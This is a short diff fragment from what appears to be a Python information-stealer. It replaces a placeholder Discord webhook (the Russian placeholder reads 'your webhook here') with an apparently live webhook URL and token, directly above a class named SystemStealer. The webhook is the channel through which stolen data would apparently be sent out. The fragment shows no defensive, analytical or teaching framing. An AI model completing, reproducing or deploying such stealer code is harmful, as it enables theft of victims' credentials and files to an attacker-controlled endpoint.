@@ -8,7 +8,7 @@ import sys
 import tempfile
 import shutil
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/твой_вебхук_здесь"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"
 
 class SystemStealer:
     def __init__(self):
